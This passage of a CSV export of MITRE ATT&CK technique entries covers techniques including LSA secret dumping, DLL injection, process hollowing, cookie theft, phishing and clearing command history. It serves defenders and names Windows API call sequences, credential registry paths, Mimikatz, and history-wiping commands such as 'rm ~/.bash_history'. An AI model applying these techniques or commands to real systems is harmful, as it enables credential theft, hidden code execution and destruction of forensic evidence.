attack-pattern--fb8d023d-45be-47e9-bc51-f56bcae6435b,11,T1048.003,Exfiltration Over Unencrypted Non-C2 Protocol,"Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.(Citation: copy_cmd_cisco)

Adversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields.","ESXi, Linux, macOS, Network Devices, Windows",FALSE,FALSE,2020-03-15T15:37:47Z
attack-pattern--1ecfdab8-7d59-4c98-95d4-dc41970f57fc,10,T1003.004,LSA Secrets,"Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts.(Citation: Passcape LSA Secrets)(Citation: Microsoft AD Admin Tier Model)(Citation: Tilbury Windows Credentials) LSA secrets are stored in the registry at <code>HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets</code>. LSA secrets can also be dumped from memory.(Citation: ired Dumping LSA Secrets)

[Reg](https://attack.mitre.org/software/S0075) can be used to extract from the Registry. [Mimikatz](https://attack.mitre.org/software/S0002) can be used to extract secrets from memory.(Citation: ired Dumping LSA Secrets)",Windows,FALSE,FALSE,2020-02-21T16:22:09Z
attack-pattern--5282dd9a-d26d-4e16-88b7-7c0f4553daf4,10,T1589,Gather Victim Identity Information,"Adversaries may gather information about the victim's identity that can be used during targeting. Information about identities may include a variety of details, including personal data (ex: employee names, email addresses, security question responses, etc.) as well as sensitive details such as credentials or multi-factor authentication (MFA) configurations.

Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about users could also be enumerated via other active means (i.e. [Active Scanning](https://attack.mitre.org/techniques/T1595)) such as probing and analyzing responses from authentication services that may reveal valid usernames in a system or permitted MFA /methods associated with those usernames.(Citation: GrimBlog UsernameEnum)(Citation: Obsidian SSPR Abuse 2023) Information about victims may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: OPM Leak)(Citation: Register Deloitte)(Citation: Register Uber)(Citation: Detectify Slack Tokens)(Citation: Forbes GitHub Creds)(Citation: GitHub truffleHog)(Citation: GitHub Gitrob)(Citation: CNET Leaks)

Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).",PRE,FALSE,FALSE,2020-10-02T14:54:59Z
attack-pattern--767dbf9e-df3f-45cb-8998-4903ab5f80c0,10,T1482,Domain Trust Discovery,"Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain.(Citation: Microsoft Trusts) Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct [SID-History Injection](https://attack.mitre.org/techniques/T1134/005), [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003), and [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).(Citation: AdSecurity Forging Trust Tickets)(Citation: Harmj0y Domain Trusts) Domain trusts can be enumerated using the `DSEnumerateDomainTrusts()` Win32 API call, .NET methods, and LDAP.(Citation: Harmj0y Domain Trusts) The Windows utility [Nltest](https://attack.mitre.org/software/S0359) is known to be used by adversaries to enumerate domain trusts.(Citation: Microsoft Operation Wilysupply)",Windows,FALSE,FALSE,2019-02-14T16:15:05Z
attack-pattern--910906dd-8c0a-475a-9cc1-5e029e2fad58,10,T1546.003,Windows Management Instrumentation Event Subscription,"Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user login, or the computer's uptime.(Citation: Mandiant M-Trends 2015)

Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system.(Citation: FireEye WMI SANS 2015)(Citation: FireEye WMI 2015) Adversaries may also compile WMI scripts – using `mofcomp.exe`  –into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription.(Citation: Dell WMI Persistence)(Citation: Microsoft MOF May 2018)

WMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.",Windows,FALSE,FALSE,2020-01-24T14:07:56Z
attack-pattern--a9d4b653-6915-42af-98b2-5758c4ceee56,10,T1059.004,Unix Shell,"Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux, macOS, and ESXi systems, though many variations of the Unix shell exist (e.g. sh, ash, bash, zsh, etc.) depending on the specific OS or distribution.(Citation: DieNet Bash)(Citation: Apple ZShell) Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.

Unix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.

Adversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with [SSH](https://attack.mitre.org/techniques/T1021/004). Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.

Some systems, such as embedded devices, lightweight Linux distributions, and ESXi servers, may leverage stripped-down Unix shells via Busybox, a small executable that contains a variety of tools, including a simple shell.","ESXi, Linux, macOS, Network Devices",FALSE,FALSE,2020-03-09T14:15:05Z
attack-pattern--e196b5c5-8118-4a1c-ab8a-936586ce3db5,10,T1584.004,Server,"Adversaries may compromise third-party servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, including for Command and Control.(Citation: TrendMicro EarthLusca 2022) Instead of purchasing a [Server](https://attack.mitre.org/techniques/T1583/004) or [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003), adversaries may compromise third-party servers in support of operations.

Adversaries may also compromise web servers to support watering hole operations, as in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), or email servers to support [Phishing](https://attack.mitre.org/techniques/T1566) operations.",PRE,FALSE,FALSE,2020-10-01T00:56:25Z
attack-pattern--f232fa7a-025c-4d43-abc7-318e81a73d65,10,T1078.004,Cloud Accounts,"Valid accounts in cloud environments may allow adversaries to perform actions to achieve Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. Cloud Accounts can exist solely in the cloud; alternatively, they may be hybrid-joined between on-premises systems and the cloud through syncing or federation with other identity sources such as Windows Active Directory.(Citation: AWS Identity Federation)(Citation: Google Federating GC)(Citation: Microsoft Deploying AD Federation)

Service or user accounts may be targeted by adversaries through [Brute Force](https://attack.mitre.org/techniques/T1110), [Phishing](https://attack.mitre.org/techniques/T1566), or various other means to gain access to the environment. Federated or synced accounts may be a pathway for the adversary to affect both on-premises systems and cloud environments - for example, by leveraging shared credentials to log onto [Remote Services](https://attack.mitre.org/techniques/T1021). High privileged cloud accounts, whether federated, synced, or cloud-only, may also allow pivoting to on-premises environments by leveraging SaaS-based [Software Deployment Tools](https://attack.mitre.org/techniques/T1072) to run commands on hybrid-joined devices.

An adversary may create long lasting [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) on a compromised cloud account to maintain persistence in the environment. Such credentials may also be used to bypass security controls such as multi-factor authentication. 

Cloud accounts may also be able to assume [Temporary Elevated Cloud Access](https://attack.mitre.org/techniques/T1548/005) or other privileges through various means within the environment. Misconfigurations in role assignments or role assumption policies may allow an adversary to use these mechanisms to leverage permissions outside the intended scope of the account. Such over privileged accounts may be used to harvest sensitive data from online storage accounts and databases through [Cloud API](https://attack.mitre.org/techniques/T1059/009) or other methods. For example, in Azure environments, adversaries may target Azure Managed Identities, which allow associated Azure resources to request access tokens. By compromising a resource with an attached Managed Identity, such as an Azure VM, adversaries may be able to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s to move laterally across the cloud environment.(Citation: SpecterOps Managed Identity 2022)","IaaS, Identity Provider, Office Suite, SaaS",FALSE,FALSE,2020-03-13T20:36:57Z
attack-pattern--f2514ae4-4e9b-4f26-a5ba-c4ae85fe93c3,10,T1680,Local Storage Discovery,"Adversaries may enumerate local drives, disks, and/or volumes and their attributes like total or free space and volume serial number. This can be done to prepare for ransomware-related encryption, to perform [Lateral Movement](https://attack.mitre.org/tactics/TA0109), or as a precursor to [Direct Volume Access](https://attack.mitre.org/techniques/T1006). 

On ESXi systems, adversaries may use [Hypervisor CLI](https://attack.mitre.org/techniques/T1059/012) commands such as `esxcli` to list storage connected to the host as well as `.vmdk` files.(Citation: TrendMicro)(Citation: TrendMicro ESXI Ransomware)

On Windows systems, adversaries can use `wmic logicaldisk get` to find information about local network drives. They can also use `Get-PSDrive` in PowerShell to retrieve drives and may additionally use Windows API functions such as `GetDriveType`.(Citation: Trend Micro MUSTANG PANDA PUBLOAD HIUPAN SEPTEMBER 2024)(Citation: Volexity)

Linux has commands such as `parted`, `lsblk`, `fdisk`, `lshw`, and `df` that can list information about disk partitions such as size, type, file system types, and free space. The command `diskutil` on MacOS can be used to list disks while `system_profiler SPStorageDataType` can additionally show information such as a volume’s mount path, file system, and the type of drive in the system. 

Infrastructure as a Service (IaaS) cloud providers also have commands for storage discovery such as `describe volume` in AWS, `gcloud compute disks list` in GCP, and `az disk list` in Azure.(Citation: AWS docs describe volumes)(Citation: GCP gcloud compute disks list)(Citation: azure az disk)","ESXi, IaaS, Linux, macOS, Windows",FALSE,FALSE,2025-09-25T21:09:38Z
attack-pattern--f4599aa0-4f85-4a32-80ea-fc39dc965945,10,T1055.001,Dynamic-link Library Injection,"Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  

DLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code> API responsible for loading the DLL). (Citation: Elastic Process Injection July 2017) 

Variations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <code>LoadLibrary</code>).(Citation: Elastic HuntingNMemory June 2017)(Citation: Elastic Process Injection July 2017) 

Another variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module's <code>AddressOfEntryPoint</code> before starting a new thread in the target process.(Citation: Module Stomping for Shellcode Injection) This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk.(Citation: Hiding Malicious Code with Module Stomping) 

Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process.",Windows,FALSE,FALSE,2020-01-14T01:26:08Z
attack-pattern--fbd91bfc-75c2-4f0c-8116-3b4e722906b3,10,T1027.015,Compression,"Adversaries may use compression to obfuscate their payloads or files. Compressed file formats such as ZIP, gzip, 7z, and RAR can compress and archive multiple files together to make it easier and faster to transfer files. In addition to compressing files, adversaries may also compress shellcode directly - for example, in order to store it in a Windows Registry key (i.e., [Fileless Storage](https://attack.mitre.org/techniques/T1027/011)).(Citation: Trustwave Pillowmint June 2020)

In order to further evade detection, adversaries may combine multiple ZIP files into one archive. This process of concatenation creates an archive that appears to be a single archive but in fact contains the central directories of the embedded archives. Some ZIP readers, such as 7zip, may not be able to identify concatenated ZIP files and miss the presence of the malicious payload.(Citation: Perception Point)

File archives may be sent as one [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) through email. Adversaries have sent malicious payloads as archived files to encourage the user to interact with and extract the malicious payload onto their system (i.e., [Malicious File](https://attack.mitre.org/techniques/T1204/002)).(Citation: NTT Security Flagpro new December 2021) However, some file compression tools, such as 7zip, can be used to produce self-extracting archives. Adversaries may send self-extracting archives to hide the functionality of their payload and launch it without requiring multiple actions from the user.(Citation: The Hacker News)

[Compression](https://attack.mitre.org/techniques/T1027/015) may be used in combination with [Encrypted/Encoded File](https://attack.mitre.org/techniques/T1027/013) where compressed files are encrypted and password-protected.","Linux, macOS, Windows",FALSE,FALSE,2025-03-04T18:29:33Z
attack-pattern--348f1eef-964b-4eb6-bb53-69b3dcb0c643,9,T1120,Peripheral Device Discovery,"Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system.(Citation: Peripheral Discovery Linux)(Citation: Peripheral Discovery macOS) Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.","Linux, macOS, Windows",FALSE,FALSE,2017-05-31T21:31:28Z
attack-pattern--bd369cd9-abb8-41ce-b5bb-fff23ee86c00,9,T1195.002,Compromise Software Supply Chain,"Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version.

Targeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Avast CCleaner3 2018)(Citation: Command Five SK 2011)","Linux, Windows, macOS",FALSE,FALSE,2020-03-11T14:17:21Z
attack-pattern--c2e147a9-d1a8-4074-811a-d8789202d916,9,T1027.003,Steganography,"Adversaries may use steganography techniques in order to prevent the detection of hidden information. Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files.

[Duqu](https://attack.mitre.org/software/S0038) was an early example of malware that used steganography. It encrypted the gathered information from a victim's system and hid it within an image before exfiltrating the image to a C2 server.(Citation: Wikipedia Duqu) 

By the end of 2017, a threat group used <code>Invoke-PSImage</code> to hide [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands in an image file (.png) and execute the code on a victim's system. In this particular case the [PowerShell](https://attack.mitre.org/techniques/T1059/001) code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary.(Citation: McAfee Malicious Doc Targets Pyeongchang Olympics)","Linux, macOS, Windows",FALSE,FALSE,2020-02-05T14:28:16Z
attack-pattern--f6dacc85-b37d-458e-b58d-74fc4bbf5755,9,T1090.001,Internal Proxy,"Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment.

By using a compromised internal system as a proxy, adversaries may conceal the true destination of C2 traffic while reducing the need for numerous connections to external systems.","ESXi, Linux, macOS, Network Devices, Windows",FALSE,FALSE,2020-03-14T23:08:20Z
attack-pattern--0458aab9-ad42-4eac-9e22-706a95bafee2,8,T1583,Acquire Infrastructure,"Adversaries may buy, lease, rent, or obtain infrastructure that can be used during targeting. A wide variety of infrastructure exists for hosting and orchestrating adversary operations. Infrastructure solutions include physical or cloud servers, domains, and third-party web services.(Citation: TrendmicroHideoutsLease) Some infrastructure providers offer free trial periods, enabling infrastructure acquisition at limited to no cost.(Citation: Free Trial PurpleUrchin) Additionally, botnets are available for rent or purchase.

Use of these infrastructure solutions allows adversaries to stage, launch, and execute operations. Solutions may help adversary operations blend in with traffic that is seen as normal, such as contacting third-party web services or acquiring infrastructure to support [Proxy](https://attack.mitre.org/techniques/T1090), including from residential proxy services.(Citation: amnesty_nso_pegasus)(Citation: FBI Proxies Credential Stuffing)(Citation: Mandiant APT29 Microsoft 365 2022) Depending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down.",PRE,FALSE,FALSE,2020-09-30T16:37:40Z
attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff,8,T1539,Steal Web Session Cookie,"An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.

Cookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)

There are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)

There are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)

After an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.","Linux, macOS, Office Suite, SaaS, Windows",FALSE,FALSE,2019-10-08T20:04:35Z
attack-pattern--1e9eb839-294b-48cc-b0d3-c45555a2a004,8,T1114.001,Local Email Collection,"Adversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a user’s local system, such as Outlook storage or cache files.

Outlook stores data locally in offline data files with an extension of .ost. Outlook 2010 and later supports .ost file sizes up to 50GB, while earlier versions of Outlook support up to 20GB.(Citation: Outlook File Sizes) IMAP accounts in Outlook 2013 (and earlier) and POP accounts use Outlook Data Files (.pst) as opposed to .ost, whereas IMAP accounts in Outlook 2016 (and later) use .ost files. Both types of Outlook data files are typically stored in `C:\Users\<username>\Documents\Outlook Files` or `C:\Users\<username>\AppData\Local\Microsoft\Outlook`.(Citation: Microsoft Outlook Files)",Windows,FALSE,FALSE,2020-02-19T18:46:06Z
attack-pattern--31fe0ba2-62fd-4fd9-9293-4043d84f7fe9,8,T1608.004,Drive-by Target,"Adversaries may prepare an operational environment to infect systems that visit a website over the normal course of browsing. Endpoint systems may be compromised through browsing to adversary controlled sites, as in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189). In such cases, the user's web browser is typically targeted for exploitation (often not requiring any extra user interaction once landing on the site), but adversaries may also set up websites for non-exploitation behavior such as [Application Access Token](https://attack.mitre.org/techniques/T1550/001). Prior to [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), adversaries must stage resources needed to deliver that exploit to users who browse to an adversary controlled site. Drive-by content can be staged on adversary controlled infrastructure that has been acquired ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or previously compromised ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).

Adversaries may upload or inject malicious web content, such as [JavaScript](https://attack.mitre.org/techniques/T1059/007), into websites.(Citation: FireEye CFR Watering Hole 2012)(Citation: Gallagher 2015) This may be done in a number of ways, including:

* Inserting malicious scripts into web pages or other user controllable web content such as forum posts
* Modifying script files served to websites from publicly writeable cloud storage buckets
* Crafting malicious web advertisements and purchasing ad space on a website through legitimate ad providers (i.e., [Malvertising](https://attack.mitre.org/techniques/T1583/008))

In addition to staging content to exploit a user's web browser, adversaries may also stage scripting content to profile the user's browser (as in [Gather Victim Host Information](https://attack.mitre.org/techniques/T1592)) to ensure it is vulnerable prior to attempting exploitation.(Citation: ATT ScanBox)

Websites compromised by an adversary and used to stage a drive-by may be ones visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is referred to a strategic web compromise or watering hole attack.

Adversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure ([Domains](https://attack.mitre.org/techniques/T1583/001)) to help facilitate [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).",PRE,FALSE,FALSE,2021-03-17T20:33:20Z
attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529,8,T1040,Network Sniffing,"Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.

Data captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [Name Resolution Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.

Network sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or [Stealth](https://attack.mitre.org/tactics/TA0005) activities. Adversaries may likely also utilize network sniffing during [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) (AiTM) to passively gain additional knowledge about the environment.

In cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)

On network devices, adversaries may perform network captures using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `monitor capture`.(Citation: US-CERT-TA18-106A)(Citation: capture_embedded_packet_on_software)","IaaS, Linux, macOS, Network Devices, Windows",FALSE,FALSE,2017-05-31T21:30:41Z
attack-pattern--3aef9463-9a7a-43ba-8957-a867e07c1e6a,8,T1070.003,Clear Command History,"In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.

On Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions. Adversaries may delete their commands from these logs by manually clearing the history (<code>history -c</code>) or deleting the bash history file <code>rm ~/.bash_history</code>.  

Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to clear command history data (<code>clear logging</code> and/or <code>clear history</code>).(Citation: US-CERT-TA18-106A) On ESXi servers, command history may be manually removed from the `/var/log/shell.log` file.(Citation: Broadcom ESXi Shell Audit)

On Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the <code>PSReadLine</code> module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.

The <code>PSReadLine</code> command history tracks the commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code> by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.(Citation: Microsoft PowerShell Command History)

Adversaries may run the PowerShell command <code>Clear-History</code> to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the <code>ConsoleHost_history.txt</code> file. Adversaries may also delete the <code>ConsoleHost_history.txt</code> file or edit its contents to hide PowerShell commands they have run.(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)","ESXi, Linux, macOS, Network Devices, Windows",FALSE,FALSE,2020-01-31T12:32:08Z
attack-pattern--3b744087-9945-4a6f-91e8-9dbceda417a4,8,T1091,Replication Through Removable Media,"Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.

Mobile devices may also be used to infect PCs with malware if connected via USB.(Citation: Exploiting Smartphone USB ) This infection may be achieved using devices (Android, iOS, etc.) and, in some instances, USB charging cables.(Citation: Windows Malware Infecting Android)(Citation: iPhone Charging Cable Hack) For example, when a smartphone is connected to a system, it may appear to be mounted similar to a USB-connected disk drive. If malware that is compatible with the connected system is on the mobile device, the malware could infect the machine (especially if Autorun features are enabled).",Windows,FALSE,FALSE,2017-05-31T21:31:08Z
attack-pattern--5bfccc3f-2326-4112-86cc-c1ece9d8a2b5,8,T1027.001,Binary Padding,"Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations. 

Binary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures.(Citation: ESET OceanLotus) The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware.(Citation: Securelist Malware Tricks April 2017) Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed.(Citation: VirusTotal FAQ)","Linux, macOS, Windows",FALSE,FALSE,2020-02-05T14:04:25Z
attack-pattern--7bd9c723-2f78-4309-82c5-47cad406572b,8,T1568,Dynamic Resolution,"Adversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations. This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware's communications. These calculations can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control.

Adversaries may use dynamic resolution for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary command and control server malware may employ dynamic resolution as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)","ESXi, Linux, macOS, Windows",FALSE,FALSE,2020-03-10T17:28:11Z
attack-pattern--a62a8db3-f23a-4d8f-afd6-9dbc77e7813b,8,T1566,Phishing,"Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns.

Adversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source, as well as evasive techniques such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., [Email Hiding Rules](https://attack.mitre.org/techniques/T1564/008)).(Citation: Microsoft OAuth Spam 2022)(Citation: Palo Alto Unit 42 VBA Infostealer 2014) Another way to accomplish this is by [Email Spoofing](https://attack.mitre.org/techniques/T1684/002)(Citation: Proofpoint-spoof) the identity of the sender, which can be used to fool both the human recipient as well as automated security tools,(Citation: cyberproof-double-bounce) or by including the intended target as a party to an existing email thread that includes malicious files or links (i.e., ""thread hijacking"").(Citation: phishing-krebs)

Victims may also receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware,(Citation: sygnia Luna Month)(Citation: CISA Remote Monitoring and Management Software) or install adversary-accessible remote management tools onto their computer (i.e., [User Execution](https://attack.mitre.org/techniques/T1204)).(Citation: Unit42 Luna Moth)","Identity Provider, Linux, macOS, Office Suite, SaaS, Windows",FALSE,FALSE,2020-03-02T18:45:07Z
attack-pattern--ae676644-d2d2-41b7-af7e-9bed1b55898c,8,T1039,Data from Network Shared Drive,"Adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration. Interactive command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information.","Linux, macOS, Windows",FALSE,FALSE,2017-05-31T21:30:41Z
attack-pattern--b200542e-e877-4395-875b-cf1a44537ca4,8,T1055.012,Process Hollowing,"Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.  

Process hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as <code>CreateProcess</code>, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as <code>ZwUnmapViewOfSection</code> or <code>NtUnmapViewOfSection</code>  before being written to, realigned to the injected code, and resumed via <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.(Citation: Leitch Hollowing)(Citation: Elastic Process Injection July 2017)

